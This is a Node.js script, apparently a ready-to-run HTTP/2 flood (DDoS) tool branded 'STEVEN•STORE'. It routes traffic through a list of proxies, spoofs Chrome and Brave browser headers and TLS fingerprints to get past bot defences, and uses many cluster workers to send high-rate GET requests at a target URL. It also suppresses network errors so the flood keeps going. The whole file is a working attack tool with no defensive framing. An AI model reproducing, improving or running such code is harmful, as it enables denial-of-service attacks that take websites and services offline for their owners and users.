//Method By STEVEN•STORE🕊🪽
const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const fs = require("fs");
const os = require('os');
process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;

if (process.argv.length < 7) {
    console.log(`node barave.js target time rate thread proxyfile`);
    process.exit();
}
function getRandomInt(min, max) {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}
const cplist = ['TLS_AES_128_GCM_SHA256', 'TLS_AES_256_GCM_SHA384', 'TLS_CHACHA20_POLY1305_SHA256'];
const sigalgs = "ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512";
const ecdhCurve = ["GREASE:x25519:secp256r1:secp384r1", "x25519"];

const secureOptions = crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_SINGLE_ECDH_USE | crypto.constants.SSL_OP_SINGLE_DH_USE | crypto.constants.SSL_OP_NO_TLSv1 | crypto.constants.SSL_OP_NO_TLSv1_1 | crypto.constants.SSL_OP_NO_COMPRESSION | crypto.constants.SSL_OP_NO_TICKET;
const secureProtocol = "TLS_method";
const secureContextOptions = {
    sigalgs: sigalgs,
    honorCipherOrder: true,
    secureOptions: secureOptions,
    secureProtocol: secureProtocol
};

const secureContext = tls.createSecureContext(secureContextOptions);

const args = {
    target: process.argv[2],
    time: ~~process.argv[3],
    Rate: ~~process.argv[4],
    threads: ~~process.argv[5],
    proxyFile: process.argv[6],
    icecool: process.argv.includes('--icecool'), // icecool optimaze ram, cpu
    dual: process.argv.includes('--dual'), // dualhyper
    brave: process.argv.includes('--brave')
};

var proxies = readLines(args.proxyFile); // Initialize proxies here

if (args.icecool) {
    proxies = proxies.filter(proxy => proxy.includes(':'));
    console.log(`random proxy: ${proxies.length} proxy loaded`);
}

const parsedTarget = url.parse(args.target);

const MAX_RAM_PERCENTAGE = 85;
const RESTART_DELAY = 1000;

if (cluster.isMaster) {
    console.clear();
    console.log(`target: ${process.argv[2]}`);
    console.log(`time: ${process.argv[3]}`);
    console.log(`rate: ${process.argv[4]}`);
    console.log(`thread: ${process.argv[5]}`);
    console.log(`proxyfile: ${process.argv[6]}`);
    console.log(`icecool: ${args.icecool}, dual: ${args.dual}, brave: ${args.brave}`);

    const restartScript = () => {
        for (const id in cluster.workers) {
            cluster.workers[id].kill();
        }
        console.log('Restarting in', RESTART_DELAY, 'ms...');
        setTimeout(() => {
            for (let counter = 1; counter <= args.threads; counter++) {
                cluster.fork();
            }
        }, RESTART_DELAY);
    };

    const handleRAMUsage = () => {
        const totalRAM = os.totalmem();
        const usedRAM = totalRAM - os.freemem();
        const ramPercentage = (usedRAM / totalRAM) * 100;
        if (ramPercentage >= MAX_RAM_PERCENTAGE) {
            console.log('Max RAM usage reached:', ramPercentage.toFixed(2), '%');
            restartScript();
        }
    };
    
    setInterval(handleRAMUsage, 10000);

    for (let counter = 1; counter <= args.threads; counter++) {
        cluster.fork();
    }

    setTimeout(() => {
        process.exit(1);
    }, args.time * 1000);

} else {
    setInterval(runFlooder);
}

class NetSocket {
    constructor() { }

    HTTP(options, callback) {
        const parsedAddr = options.address.split(":");
        const addrHost = parsedAddr[0];
        const payload = `CONNECT ${options.address}:443 HTTP/1.1\r\nHost: ${options.address}:443\r\nConnection: Keep-Alive\r\n\r\n`;
        const buffer = Buffer.from(payload);

        const connection = net.connect({
            host: options.host,
            port: options.port,
            allowHalfOpen: true,
            writable: true,
            readable: true,
        });

        connection.setTimeout(options.timeout * 1000);
        connection.setKeepAlive(true, args.time * 1000);
        connection.setNoDelay(true);

        connection.on("connect", () => {
            connection.write(buffer);
        });

        connection.on("data", chunk => {
            const response = chunk.toString("utf-8");
            if (!response.includes("HTTP/1.1 200")) {
                connection.destroy();
                return callback(undefined, "error: invalid response from proxy server");
            }
            return callback(connection, undefined);
        });

        connection.on("timeout", () => {
            connection.destroy();
            return callback(undefined, "error: timeout exceeded");
        });

        connection.on("error", error => {
            connection.destroy();
            return callback(undefined, "error: " + error);
        });
    }
}

const Socker = new NetSocket();

function readLines(filePath) {
    return fs.readFileSync(filePath, "utf-8").split(/\r?\n/);
}

function randomIntn(min, max) {
    return Math.floor(Math.random() * (max - min) + min);
}

function randomElement(elements) {
    return elements[randomIntn(0, elements.length)];
}

function bexRandomString(min, max) {
    const length = randomIntn(min, max);
    const mask = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    return Array.from({ length }, () => mask[Math.floor(Math.random() * mask.length)]).join('');
}

function sanitizePath(path) {
    return path.replace(/[^a-zA-Z0-9-_./]/g, '');
}

function randomIP() {
    return Array(4).fill(0).map(() => Math.floor(Math.random() * 256)).join('.');
}

const fingerprint = crypto.randomBytes(16).toString('hex');




function runFlooder() {
    const proxyAddr = randomElement(proxies);
    const parsedProxy = proxyAddr.split(":");
    
    const randomIntn = (min, max) => Math.floor(Math.random() * (max - min)) + min;


    
    
const browserVersion = getRandomInt(125, 128);
    const fwfw = ['Google Chrome', 'Brave'];
    const wfwf = fwfw[Math.floor(Math.random() * fwfw.length)];
    let brandValue;
    if (browserVersion === 125) {
        brandValue = `"Not_A Brand";v="8", "Chromium";v="${browserVersion}", "${wfwf}";v="${browserVersion}"`;
    }
    else if (browserVersion === 126) {
        brandValue = `"Not A(Brand";v="99", "${wfwf}";v="${browserVersion}", "${wfwf}";v="${browserVersion}"`;
    }
    else if (browserVersion === 127) {
        brandValue = `"Chromium";v="${browserVersion}", "Not(A:Brand";v="24", "${wfwf}";v="${browserVersion}"`;
    }
    else if (browserVersion === 128) {
        brandValue = `"${wfwf}";v="${browserVersion}", "Not:A-Brand";v="24", "${wfwf}";v="${browserVersion}"`;
    }
    const isBrave = wfwf === 'Brave';

 const acceptHeaderValue = isBrave
                            ? 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8'
                            : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7';

                        const langValue = isBrave
                            ? 'en-US,en;q=0.9'
                            : 'en-US,en;q=0.7';

    const userAgent = `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${browserVersion}.0.0.0 Safari/537.36`;
    const secChUa = `${brandValue}`;
    
    function randstr(length) {
		const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
		let result = "";
		const charactersLength = characters.length;
		for (let i = 0; i < length; i++) {
			result += characters.charAt(Math.floor(Math.random() * charactersLength));
		}
		return result;
	}
    const headersbex = {
        ":method": "GET",
        ":scheme": "https",
        ":authority": parsedTarget.host,
        ":path": parsedTarget.path,
        'User-Agent': userAgent,
        'Accept': acceptHeaderValue,
        'Accept-Language': langValue,
        'Accept-Encoding': 'gzip, deflate, br',              
        "cache-control": "max-age=0",
        'content-type': 'text/html; charset=UTF-8',
        'x-frame-options': 'SAMEORIGIN',
        'referrer-policy': 'same-origin',
        "content-encoding": "gzip",
        "pragma": "no-cache",
        "sec-ch-ua": secChUa,
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "document",
        "sec-fetch-mode": "navigate",
        "sec-fetch-site": "none",
        "sec-fetch-user": "?1",
        "sec-gpc": "1",
        "upgrade-insecure-requests": "1",
        "Origin": `https://${parsedTarget.host}`,
        "Referer": `https://${parsedTarget.host}`,
    };

    const proxyOptions = {
        host: parsedProxy[0],
        port: ~~parsedProxy[1],
        address: parsedTarget.host + ":443",
        timeout: 100,
    };

    Socker.HTTP(proxyOptions, (connection, error) => {
        if (error) return;

        connection.setKeepAlive(true, args.time * 1000);
        connection.setNoDelay(true);

        const tlsOptions = {
            secure: true,
            ALPNProtocols: ['h2', 'http/1.1'],
            ciphers: randomElement(cplist),
            ciphers: 'TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256',
            requestCert: true,
            sigalgs: sigalgs,
            socket: connection,
            ecdhCurve: ecdhCurve,
            secureContext: secureContext,
            honorCipherOrder: true,
            rejectUnauthorized: true,
            minVersion: 'TLSv1.2',
            maxVersion: 'TLSv1.3',
            secureOptions: secureOptions,
            host: parsedTarget.host,
            servername: parsedTarget.host,
        };

        // Điều chỉnh cho chế độ Brave
        if (args.brave) {
            tlsOptions.ALPNProtocols = ["h2", "http/1.1"];
            tlsOptions.maxVersion = 'TLSv1.3';
            tlsOptions.minVersion = 'TLSv1.2';
            headersbex['User-Agent'] = userAgent;
            headersbex["sec-ch-ua"] = secChUa;
            headersbex['DNT'] = '1';
            if (Math.random() < 0.3) headersbex['X-Requested-With'] = 'XMLHttpRequest';
            if (Math.random() < 0.2) headersbex['Referer'] = 'https://${parsedTarget.host}';
            if (Math.random() < 0.1) headersbex['Origin'] = 'https://${parsedTarget.host}';
            headersbex['X-Brave-Fingerprint'] = fingerprint;
        }        

        const tlsBex = tls.connect(443, parsedTarget.host, tlsOptions);

        tlsBex.allowHalfOpen = true;
        tlsBex.setNoDelay(true);
        tlsBex.setKeepAlive(true, args.time * 1000);
        tlsBex.setMaxListeners(0);

        const bexClient = http2.connect(parsedTarget.href, {
            protocol: "https:",
            createConnection: () => tlsBex,
            settings: {
                headerTableSize: 65536,
                maxConcurrentStreams: 10000,
                initialWindowSize: 6291456,
                maxHeaderListSize: 65536,
                enablePush: false,
            },
             maxSessionMemory: 64000,
             maxDeflateDynamicTableSize: 4294967295,
             createConnection: () => tlsBex,
             socket: connection,
        });
         
        const requestRate = args.dual ? args.Rate * 2 : args.Rate;
        const requestInterval = args.icecool ? Math.floor(1000 / requestRate) + randomIntn(100, 200) : 1000 / requestRate;
        const IntervalAttack = setInterval(() => {
            for (let i = 0; i < requestRate; i++) {
                const bex = bexClient.request(headersbex)
                    .on('response', response => {
                        console.log("Response:", response);
                        bex.close();
                        bex.destroy();
                    });
                bex.end();
            }
        }, requestInterval);

        setTimeout(() => clearInterval(IntervalAttack), args.time * 1000);

        bexClient.on("close", () => {
            bexClient.destroy();
            connection.destroy();
        });

        bexClient.on("error", () => {
            bexClient.destroy();
            connection.destroy();
        });
    });
}
 
 
 const KillScript = () => process.exit(1);
 
 setTimeout(KillScript, args.time * 1000);


const ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError', 'TimeoutError', 'JSONError', 'URLError', 'InvalidURL', 'ProxyError'];
const ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO', 'EAI_AGAIN', 'EHOSTDOWN', 'ENETRESET', 'ENETUNREACH', 'ENONET', 'ENOTCONN', 'ENOTFOUND', 'EAI_NODATA', 'EAI_NONAME', 'EADDRNOTAVAIL', 'EAFNOSUPPORT', 'EALREADY', 'EBADF', 'ECONNABORTED', 'EDESTADDRREQ', 'EDQUOT', 'EFAULT', 'EHOSTUNREACH', 'EIDRM', 'EILSEQ', 'EINPROGRESS', 'EINTR', 'EINVAL', 'EIO', 'EISCONN', 'EMFILE', 'EMLINK', 'EMSGSIZE', 'ENAMETOOLONG', 'ENETDOWN', 'ENOBUFS', 'ENODEV', 'ENOENT', 'ENOMEM', 'ENOPROTOOPT', 'ENOSPC', 'ENOSYS', 'ENOTDIR', 'ENOTEMPTY', 'ENOTSOCK', 'EOPNOTSUPP', 'EPERM', 'EPIPE', 'EPROTONOSUPPORT', 'ERANGE', 'EROFS', 'ESHUTDOWN', 'ESPIPE', 'ESRCH', 'ETIME', 'ETXTBSY', 'EXDEV', 'UNKNOWN', 'DEPTH_ZERO_SELF_SIGNED_CERT', 'UNABLE_TO_VERIFY_LEAF_SIGNATURE', 'CERT_HAS_EXPIRED', 'CERT_NOT_YET_VALID'];
process.on('uncaughtException', function(e) {
   if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).on('unhandledRejection', function(e) {
   if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).on('warning', e => {
   if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).setMaxListeners(0);